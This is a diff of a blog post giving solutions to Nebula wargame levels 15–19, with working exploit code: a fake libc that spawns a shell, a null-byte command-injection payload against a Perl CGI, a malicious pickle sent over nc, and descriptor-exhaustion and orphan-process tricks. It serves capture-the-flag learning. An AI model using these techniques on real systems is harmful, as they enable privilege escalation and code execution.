@@ -7,7 +7,8 @@
 	<meta name="author" content="Louis Li">
 
 	
-	<meta name="description" content="Nebula Shell Exploits (Solutions 15-19) Shell-based exploit exercises Overview This is third and final post of my solutions for Exploit Exercises. &hellip;">
+	<meta name="description" content="Nebula Shell Exploits (Solutions 15-19) Shell-based exploit exercises Overview
+This is third and final post of my solutions for Exploit Exercises. &hellip;">
 	
 
   <!-- http://t.co/dKP3o1e -->
@@ -23,6 +24,9 @@
 	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
 	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+        <script type="text/javascript"
+            src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+          </script>
 	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
 	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
 <link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
@@ -96,105 +100,73 @@
 				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
 	<h1 class="title" itemprop="name">Nebula Shell Exploits (Solutions 15-19)</h1>
         <h3 class="subtitle" itemprop="subtitle">Shell-based exploit exercises </h3>
-	<div class="entry-content" itemprop="articleBody"><h1>Overview</h1>
+	<div class="entry-content" itemprop="articleBody"><h1 id="overview">Overview</h1>
+<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 – I was distracted by some other projects.</p>
 
-<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 &mdash; I was distracted by some other projects.</p>
-
-<h2>Level 15</h2>
-
+<h2 id="level-15">Level 15</h2>
 <p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level15">(full)</a>: <code>strace</code> on the binary reveals that it searches for libraries based on <a href="http://saintaardvarkthecarpeted.com/blog/archive/2005/08/_etc_ld_so_nohwcap.html">hardware capabilities</a>.</p>
 
-<div>
-  <pre><code class='console'>$ strace /home/flag15/flag15 2&gt;&amp;1 | less
-...
-stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
-open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
-stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
-open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
-stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
-open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)
-mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000
-access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
-open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
-stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
-...</code></pre>
-</div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> strace /home/flag15/flag15 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> less
+<span class="go">...</span>
+<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
+<span class="go">open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
+<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
+<span class="go">open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
+<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
+<span class="go">open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)</span>
+<span class="go">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000</span>
+<span class="go">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span>
+<span class="go">open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
+<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
+<span class="go">...</span></code></pre></div>
 
-
-<p>We want to either substitute our own version of libc, overriding the <code>puts()</code> call in <code>flag15</code>, or we want to execute code in the process. While the hard part isn&rsquo;t creating our own shared library, we have to figure out how to prevent <code>libc</code> from being linked into our library. This solution executes code in the makeshift <code>libc.so</code>.</p>
+<p>We want to either substitute our own version of libc, overriding the <code>puts()</code> call in <code>flag15</code>, or we want to execute code in the process. While the hard part isn’t creating our own shared library, we have to figure out how to prevent <code>libc</code> from being linked into our library. This solution executes code in the makeshift <code>libc.so</code>.</p>
 
 <!-- more -->
 
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="c"># /home/level15/flag.sh</span>
+getflag &gt; /home/flag15/getflag.log</code></pre></div>
 
-<div>
-  <pre><code class='bash'>#!/bin/bash
-# /home/level15/flag.sh
-getflag &gt; /home/flag15/getflag.log</code></pre>
-</div>
+<p><br />
+<code>~/version</code>: preventing an error about requiring <code>GLIBC_2.0</code>:</p>
 
+<div class="highlight"><pre><code class="language-text" data-lang="text">GLIBC_2.0 { };</code></pre></div>
 
+<p><br />
+<code>~/run.sh</code>: A makeshift Makefile that also executes our code.</p>
 
-
-<br />
-
-
-<p><code>~/version</code>: preventing an error about requiring <code>GLIBC_2.0</code>:</p>
-
-<div>
-  <pre><code class='text'>GLIBC_2.0 { };</code></pre>
-</div>
-
-
-
-
-<br />
-
-
-<p><code>~/run.sh</code>: A makeshift Makefile that also executes our code.</p>
-
-<div>
-  <pre><code class='bash'>#!/bin/bash -ex
-# run.sh
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash -ex</span>
+<span class="c"># run.sh</span>
 gcc -fPIC -g -c -Wall getflag.c
 gcc -shared -Wl,-Bstatic,-soname,libc.so.6,--version-script,version -o libc.so.6 getflag.o  -L/usr/lib/i386-linux-gnu -static-libgcc
 mv /home/level15/libc.so.6 /var/tmp/flag15/
 /home/flag15/flag15
-cat /home/flag15/getflag.log</code></pre>
-</div>
+cat /home/flag15/getflag.log</code></pre></div>
 
+<p><br />
+<code>~/getflag.c</code>: another interpretation of “libc,” but it happens to call <code>execv</code>.</p>
 
-<p> <br/>
-<code>~/getflag.c</code>: another interpretation of &ldquo;libc,&rdquo; but it happens to call <code>execv</code>.</p>
+<div class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;sys/syscall.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
 
-<div>
-  <pre><code class='cpp'>#include &lt;stdio.h&gt;
-#include &lt;sys/syscall.h&gt;
-#include &lt;unistd.h&gt;
+<span class="c1">// If this isn&#39;t here, we have an error about a missing symbol</span>
+<span class="kt">void</span> <span class="nf">__cxa_finalize</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">d</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
 
-// If this isn&#39;t here, we have an error about a missing symbol
-void __cxa_finalize(void *d) {
-    return;
-}
+<span class="c1">// http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html</span>
+<span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">))</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">args_new</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;/home/level15/flag.sh&quot;</span> <span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">args_new</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
 
-// http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html
-int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
-    char *args_new[] = { &quot;/bin/sh&quot;, &quot;/home/level15/flag.sh&quot; };
-    execve(&quot;/bin/sh&quot;, args_new);
-    return 0;
-}</code></pre>
-</div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./run.sh
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></div>
 
-
-
-
-<div>
-  <pre><code class='console'>$ ./run.sh
-You have successfully executed getflag on a target account</code></pre>
-</div>
-
-
-<h2>Level 16</h2>
-
+<h2 id="level-16">Level 16</h2>
 <p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level16">(full)</a>: A Perl script running on port 1616 runs <code>egrep</code> with user input. It has some red herrings about a username and a password, but the goal is to execute arbitrary code.</p>
 
 <p>This solution uses <a href="http://hakipedia.com/index.php/Poison_Null_Byte">null byte injection</a> to execute arbitrary commands on the target account.</p>
@@ -202,252 +174,191 @@ You have successfully executed getflag on a target account</code></pre>
 <p>There are two parts to the solution:</p>
 
 <ol>
-<li>The Perl script converts all input to uppercase. We work around this by using a wildcard match, searching for <code>/tmp/RUN/</code> (our script) as <code>/*/RUN</code>.</li>
-<li>The Perl string doesn&rsquo;t immediately allow us to execute arbitrary code. We have to terminate the string correctly with the right combination of <code>"</code>, &ldquo;<code>\``", and</code>%00`. The last one is the null character in a URL.</li>
+  <li>The Perl script converts all input to uppercase. We work around this by using a wildcard match, searching for <code>/tmp/RUN/</code> (our script) as <code>/*/RUN</code>.</li>
+  <li>The Perl string doesn’t immediately allow us to execute arbitrary code. We have to terminate the string correctly with the right combination of <code>"</code>, “<code>\</code><code>", and </code>%00`. The last one is the null character in a URL.</li>
 </ol>
 
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="c"># /home/level16/curl</span>
+<span class="nb">echo</span> <span class="nv">$1</span>  <span class="c"># sanity check</span>
+<span class="nv">url</span><span class="o">=</span><span class="s2">&quot;http://localhost:1616/index.cgi?username=$1&amp;password=foo&quot;</span>
+<span class="nb">echo</span> <span class="nv">$uri</span>
+curl --globoff <span class="nv">$3</span> <span class="s2">&quot;$uri&quot;</span>
+ls /home/flag16 <span class="p">|</span> grep getflag.log</code></pre></div>
 
-<div>
-  <pre><code class='bash'>#!/bin/bash
-# /home/level16/curl
-echo $1  # sanity check
-url=&quot;http://localhost:1616/index.cgi?username=$1&amp;password=foo&quot;
-echo $uri
-curl --globoff $3 &quot;$uri&quot;
-ls /home/flag16 | grep getflag.log</code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="c"># /tmp/RUN</span>
+getflag &gt; /home/flag16/getflag.log</code></pre></div>
 
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ~/curl <span class="s1">&#39; &quot;`/*/RUN` %00 &#39;</span>
+<span class="gp">$</span> cat /home/flag16/getflag.log
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></div>
 
-
-
-<div>
-  <pre><code class='bash'>#!/bin/bash
-# /tmp/RUN
-getflag &gt; /home/flag16/getflag.log</code></pre>
-</div>
-
-
-
-
-<div>
-  <pre><code class='console'>$ ~/curl &#39; &quot;`/*/RUN` %00 &#39;
-$ cat /home/flag16/getflag.log
-You have successfully executed getflag on a target account</code></pre>
-</div>
-
-
-<h2>Level 17</h2>
-
+<h2 id="level-17">Level 17</h2>
 <p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level17">(full)</a>: A Python script running on port 10007 loads pickled data from input.</p>
 
 <p>The vulnerability of the Python <code>pickle</code> module is <a href="https://www.google.com/search?q=pickle+vulnerability">well-documented</a>. The Python docs say:</p>
 
-<blockquote><p>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source</p></blockquote>
+<blockquote>
+  <p>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source</p>
+</blockquote>
 
 <p><a href="http://nadiana.com/python-pickle-insecure">This article</a> gives us an example of malicious Pickle data.</p>
 
-<p>Our pickled &ldquo;data&rdquo; goes in <code>~/cmd</code>:</p>
+<p>Our pickled “data” goes in <code>~/cmd</code>:</p>
 
-<div>
-  <pre><code class='text'>cos
+<div class="highlight"><pre><code class="language-text" data-lang="text">cos
 system
 (S&#39; /tmp/run17&#39;
-tR.</code></pre>
-</div>
-
+tR.</code></pre></div>
 
 <p>We send the pickled data to the listening script.</p>
 
-<div>
-  <pre><code class='console'>$ cat /tmp/run17
-#!/bin/bash
-getflag &gt; /home/flag17/getflag.log
-$ cat cmd | nc localhost 10007
-Accepted connection from 127.0.0.1:56228^C
-$ cat /home/flag17/getflag.log
-You have successfully executed getflag on a target account</code></pre>
-</div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> cat /tmp/run17
+<span class="gp">#</span>!/bin/bash
+<span class="go">getflag &gt; /home/flag17/getflag.log</span>
+<span class="gp">$</span> cat cmd <span class="p">|</span> nc localhost 10007
+<span class="go">Accepted connection from 127.0.0.1:56228^C</span>
+<span class="gp">$</span> cat /home/flag17/getflag.log
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></div>
 
+<h3 id="interpreting-pickled-data">Interpreting Pickled data</h3>
+<p>I was curious about the parts of the malicious pickle. I searched first for the <code>pickle</code> format specification, but I wasn’t able to find it. I was a bit surprised that I was only able to find <a href="http://peadrop.com/blog/2007/06/18/pickle-an-interesting-stack-language/">one article</a> related to the semantics of the pickle format. Part of our input is explained:</p>
 
-<h3>Interpreting Pickled data</h3>
+<blockquote>
+  <p>The ‘(‘ is simply a marker. It is a object in the stack that tells the tuple builder, ‘t’, when to stop. The tuple builder pops items from the stack until it reaches a marker. Then, it creates a tuple with these items and pushes this tuple back on the stack. You can use multiple markers to construct a nested tuple…</p>
+</blockquote>
 
-<p>I was curious about the parts of the malicious pickle. I searched first for the <code>pickle</code> format specification, but I wasn&rsquo;t able to find it. I was a bit surprised that I was only able to find <a href="http://peadrop.com/blog/2007/06/18/pickle-an-interesting-stack-language/">one article</a> related to the semantics of the pickle format. Part of our input is explained:</p>
-
-<blockquote><p>The ‘(‘ is simply a marker. It is a object in the stack that tells the tuple builder, ‘t’, when to stop. The tuple builder pops items from the stack until it reaches a marker. Then, it creates a tuple with these items and pushes this tuple back on the stack. You can use multiple markers to construct a nested tuple&hellip;</p></blockquote>
-
-<h2>Level 18</h2>
-
+<h2 id="level-18">Level 18</h2>
 <p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level18">(full)</a>: <code>flag18</code> is a program that mimics a login shell with various options such as <code>login</code>, <code>logout</code>, <code>shell</code> (see full description). The flag directory contains an unreadable password file.</p>
 
-<h3>Discussion</h3>
-
+<h3 id="discussion">Discussion</h3>
 <p>This problem was more complex than the others, given the number of options provided initially.</p>
 
 <p>There are flags on <code>flag19</code> for a debug file and a verbose level. Using <code>-d /dev/tty</code> saves us some effort.</p>
 
-<div>
-  <pre><code class='console'>$ /home/flag19/flag19 -d /dev/tty -vvvvv
-login
-got [login] as input
-attempting to login</code></pre>
-</div>
-
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> /home/flag19/flag19 -d /dev/tty -vvvvv
+<span class="go">login</span>
+<span class="go">got [login] as input</span>
+<span class="go">attempting to login</span></code></pre></div>
 
 <p>If we iterate through the possible commands, we can rule out some paths.</p>
 
 <ul>
-<li>There&rsquo;s no apparent path for dumping the contents of the password file through the code.</li>
-<li>The <code>notsupported()</code> and <code>setuser()</code> functions seem to deal with strings and buffers. These are potential solutions, but from a metagame perspective, Nebula solutions use shell exploits, not memory exploits.</li>
+  <li>There’s no apparent path for dumping the contents of the password file through the code.</li>
+  <li>The <code>notsupported()</code> and <code>setuser()</code> functions seem to deal with strings and buffers. These are potential solutions, but from a metagame perspective, Nebula solutions use shell exploits, not memory exploits.</li>
 </ul>
-
 
 <p>We can confirm this by trying playing around with buffer overflows and format strings:</p>
 
-<div>
-  <pre><code class='text'>site exec %s%s%s%s%s  # notsupported() -&gt; prints some of the stack
+<div class="highlight"><pre><code class="language-text" data-lang="text">site exec %s%s%s%s%s  # notsupported() -&gt; prints some of the stack
 site exec %n  # notsupported() -&gt; fails with *** %n in writable segment detected ***
-setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  # setuser() -&gt; exits immediately, detecting buffer overflow</code></pre>
-</div>
+setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  # setuser() -&gt; exits immediately, detecting buffer overflow</code></pre></div>
 
+<h3 id="solution">Solution</h3>
 
-<h3>Solution</h3>
+<p><code>if(fp)</code> will fail if the file can’t be opened for any reason. Since the files opened by <code>login</code> are never closed, we can open files until we reach the maximum number of file descriptors. <code>fp</code> will then be <code>NULL</code> once the maximum number is reached. Finally, we use <code>closelog</code> to free a file descriptor.</p>
 
-<p><code>if(fp)</code> will fail if the file can&rsquo;t be opened for any reason. Since the files opened by <code>login</code> are never closed, we can open files until we reach the maximum number of file descriptors. <code>fp</code> will then be <code>NULL</code> once the maximum number is reached. Finally, we use <code>closelog</code> to free a file descriptor.</p>
+<p>If <code>closelog</code> isn’t called, <code>execve("/bin/sh", ...)</code> will fail with an error loading a shared library <code>libncurses.so.5</code>.</p>
 
-<p>If <code>closelog</code> isn&rsquo;t called, <code>execve("/bin/sh", ...)</code> will fail with an error loading a shared library <code>libncurses.so.5</code>.</p>
-
-<div>
-  <pre><code class='console'>$ for i in $(seq 1 2000); do echo &quot;login foo&quot; &gt;&gt; ~/flood; done
-$ echo &quot;closelog&quot; &gt;&gt; ~/flood
-$ echo &quot;shell&quot; &gt;&gt; ~/flood
-$ echo &quot;getflag &gt; /tmp/getflag.log&quot; &gt; /tmp/getflag &amp;&amp; chmod a+x /tmp/getflag</code></pre>
-</div>
-
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">1</span> 2000<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&quot;login foo&quot;</span> &gt;&gt; ~/flood<span class="p">;</span> <span class="k">done</span>
+<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;closelog&quot;</span> &gt;&gt; ~/flood
+<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;shell&quot;</span> &gt;&gt; ~/flood
+<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;getflag &gt; /tmp/getflag.log&quot;</span> &gt; /tmp/getflag <span class="o">&amp;&amp;</span> chmod a+x /tmp/getflag</code></pre></div>
 
 <p>The initial attempt looks like this:</p>
 
-<div>
-  <pre><code class='console'>$ cd /home/flag18/
-$ cat ~/flood | ./flag18 -d /dev/tty
-...
-/home/flag18/flag18: -d: invalid option</code></pre>
-</div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag18/
+<span class="gp">$</span> cat ~/flood <span class="p">|</span> ./flag18 -d /dev/tty
+<span class="go">...</span>
+<span class="go">/home/flag18/flag18: -d: invalid option</span></code></pre></div>
 
+<p><code>sh</code> doesn’t have a <code>-d</code> flag. The author left a hint to look at the options in the man page; <code>sh</code> needs an option that ignores the input afterwards.</p>
 
-<p><code>sh</code> doesn&rsquo;t have a <code>-d</code> flag. The author left a hint to look at the options in the man page; <code>sh</code> needs an option that ignores the input afterwards.</p>
-
-<div>
-  <pre><code class='console'>$ cat ~/flood | ./flag18 --init-file /tmp/getflag -d /dev/tty</code></pre>
-</div>
-
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> cat ~/flood <span class="p">|</span> ./flag18 --init-file /tmp/getflag -d /dev/tty</code></pre></div>
 
 <p>This actually opens a promptless shell reading from stdin.</p>
 
-<div>
-  <pre><code class='console'>...
-logged in successfully (without password file)
-logged in successfully (without password file)
-logged in successfully (without password file)
-whoami
-flag18
-cat /home/flag18/password
-44226113-d394-4f46-9406-91888128e27a
-getflag
-You have successfully executed getflag on a target account</code></pre>
-</div>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">...</span>
+<span class="go">logged in successfully (without password file)</span>
+<span class="go">logged in successfully (without password file)</span>
+<span class="go">logged in successfully (without password file)</span>
+<span class="go">whoami</span>
+<span class="go">flag18</span>
+<span class="go">cat /home/flag18/password</span>
+<span class="go">44226113-d394-4f46-9406-91888128e27a</span>
+<span class="go">getflag</span>
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></div>
 
+<p>The password doesn’t seem to work for logging into the <code>flag18</code> account, but the shell can execute <code>getflag</code>.</p>
 
-<p>The password doesn&rsquo;t seem to work for logging into the <code>flag18</code> account, but the shell can execute <code>getflag</code>.</p>
-
-<h2>Level 19</h2>
-
+<h2 id="level-19">Level 19</h2>
 <p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level19">(full)</a>: The <code>flag19</code> executable checks if the root user started the process. If so, then it runs <code>execve</code> on <code>/bin/sh</code>.</p>
 
-<p><a href="http://cs61.seas.harvard.edu/cs61wiki/images/7/7b/Lec21-Processes.pdf">CS61 Lecture Notes (Processes)</a> was particularly valuable here. I won&rsquo;t end up taking the class, but I should show my appreciation for the lecture notes &mdash; they&rsquo;re all very well made.</p>
+<p><a href="http://cs61.seas.harvard.edu/cs61wiki/images/7/7b/Lec21-Processes.pdf">CS61 Lecture Notes (Processes)</a> was particularly valuable here. I won’t end up taking the class, but I should show my appreciation for the lecture notes – they’re all very well made.</p>
 
 <p>We want to start <code>flag19</code> in an <a href="http://en.wikipedia.org/wiki/Orphan_process">orphan process</a>. An orphan process is claimed by the program <code>init</code> (PID 1), which is owned by root (UID 0). The plan looks like:</p>
 
 <ol>
-<li>Use <code>fork()</code> to create a child process, exit the parent process, and <code>sleep()</code> to create an orphan.</li>
-<li>Execute <code>/home/flag19/flag19</code> with our arguments The <code>stat</code> should complete successfully, as we control the time of check.</li>
+  <li>Use <code>fork()</code> to create a child process, exit the parent process, and <code>sleep()</code> to create an orphan.</li>
+  <li>Execute <code>/home/flag19/flag19</code> with our arguments The <code>stat</code> should complete successfully, as we control the time of check.</li>
 </ol>
 
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// attempt.c</span>
 
-<div>
-  <pre><code class='c'>// attempt.c
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
 
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;stdio.h&gt;
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;executing code in orphan…</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+		<span class="kt">char</span> <span class="o">*</span><span class="n">flag19_args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;-c&quot;</span> <span class="s">&quot;/home/level19/run19.sh&quot;</span> <span class="p">};</span>
+		<span class="n">execv</span><span class="p">(</span><span class="s">&quot;/home/flag19/flag19&quot;</span><span class="p">,</span> <span class="n">flag19_args</span><span class="p">);</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;returning from parent</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;sanity check, outside both - should never happen</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span></code></pre></div>
 
-int main() {
-    if (fork() == 0) {
-        sleep(10);
-        printf(&quot;executing code in orphan…\n&quot;);
-        fflush(stdout);
-        char *flag19_args[] = { &quot;-c&quot; &quot;/home/level19/run19.sh&quot; };
-        execv(&quot;/home/flag19/flag19&quot;, flag19_args);
-        return;
-    }
-    else {
-        printf(&quot;returning from parent\n&quot;);
-        exit(0);
-    }
-    printf(&quot;sanity check, outside both - should never happen\n&quot;);
-}</code></pre>
-</div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash.sh</span>
+<span class="c"># /home/level19/run19.sh</span>
+<span class="c"># Standard getflag wrapper</span>
+<span class="nv">file</span><span class="o">=</span>/home/flag19/getflag19.log
+getflag &gt; <span class="k">${</span><span class="nv">file</span><span class="k">}</span>
+id &gt;&gt; <span class="k">${</span><span class="nv">file</span><span class="k">}</span></code></pre></div>
 
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gcc -o attempt.c attempt
+<span class="gp">$</span> ./attempt
+<span class="go">returning from parent</span>
+<span class="gp">$</span> executing code in orphan...
+<span class="gp">$</span> cat /home/flag19/getflag19.log
+<span class="go">You have successfully executed getflag on a target account</span>
+<span class="go">uid=1020(level19) ...</span></code></pre></div>
 
-
-
-<div>
-  <pre><code class='bash'>#!/bin/bash.sh
-# /home/level19/run19.sh
-# Standard getflag wrapper
-file=/home/flag19/getflag19.log
-getflag &gt; ${file}
-id &gt;&gt; ${file}</code></pre>
-</div>
-
-
-
-
-<div>
-  <pre><code class='console'>$ gcc -o attempt.c attempt
-$ ./attempt
-returning from parent
-$ executing code in orphan...
-$ cat /home/flag19/getflag19.log
-You have successfully executed getflag on a target account
-uid=1020(level19) ...</code></pre>
-</div>
-
-
-<h3>Tangent</h3>
-
+<h3 id="tangent">Tangent</h3>
 <p>I ran into an interesting issue caused by laziness (well, in reality, a desire for flexibility).</p>
 
 <p>The code below does <strong>not</strong> run <code>execve</code> as suid. It runs it as the user <code>level19</code> instead of <code>flag19</code>, which may have been caused by passing down <code>envp</code>.</p>
 
-<div>
-  <pre><code class='c'>int main(int argc, char **argv, char **envp) {
-    if (fork () == 0) {
-        // our other code…
-        execve(&quot;/home/flag19/flag19&quot;, argv, envp);
-    }
-}</code></pre>
-</div>
-
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span> <span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
